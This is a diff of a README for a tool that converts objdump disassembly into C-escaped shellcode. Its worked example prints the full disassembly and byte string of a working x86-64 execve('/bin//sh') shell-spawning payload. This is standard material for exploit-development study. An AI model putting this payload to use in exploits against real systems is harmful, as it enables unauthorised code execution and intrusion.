@@ -1,21 +1,37 @@
 shellcode-generator
 ===================
 
-Tool for preparing shellcodes. Unfortunately, at the moment it only allows
-for converting raw binary data to ANSI-C quoted form.
+Tool for preparing shellcodes. Converts objdump disassembly to ANSI-C quoted form.
 
-`$ ./shellcode-generator -h`
-`Usage: ./shellcode-generator [options]`
-`-f <File> Use File as an input instead of stdin`
-`-o <File> Redirect output to File`
-`-h Prints this help and exits`
-``
-`$ hd file`
-`00000000  41 20 73 68 6f 72 74 20  66 69 6c 65 20 66 6f 72  |A short file for|`
-`00000010  20 64 65 6d 6f 6e 73 74  72 61 74 69 6f 6e 2e 0a  | demonstration..|`
-`00000020  0a                                                |.|`
-`00000021`
-``
-`$ ./shellcode-generator -f ./file`
-`\x41\x20\x73\x68\x6f\x72\x74\x20\x66\x69\x6c\x65\x20\x66\x6f\x72\x20\x64\x65\x6d\x6f\x6e\x73\x74\x72\x61\x74\x69\x6f\x6e\x2e\xa\xa`
+```
+$ ./shellcode-generator -h
+Usage: ./shellcode-generator [options]
+-f <File> Use File as an input instead of stdin
+-o <File> Redirect output to File
+-h Prints this help and exits
 
+$ objdump -d ../shellcode
+
+../shellcode:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400078 <_start>:
+  400078:	48 31 d2             	xor    %rdx,%rdx
+  40007b:	48 bb ff 2f 62 69 6e 	movabs $0x68732f6e69622fff,%rbx
+  400082:	2f 73 68 
+  400085:	48 c1 eb 08          	shr    $0x8,%rbx
+  400089:	53                   	push   %rbx
+  40008a:	48 89 e7             	mov    %rsp,%rdi
+  40008d:	48 31 c0             	xor    %rax,%rax
+  400090:	50                   	push   %rax
+  400091:	57                   	push   %rdi
+  400092:	48 89 e6             	mov    %rsp,%rsi
+  400095:	b0 3b                	mov    $0x3b,%al
+  400097:	0f 05                	syscall 
+
+$ objdump -d ../shellcode | ./shellcode-generator 
+\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
+
+```
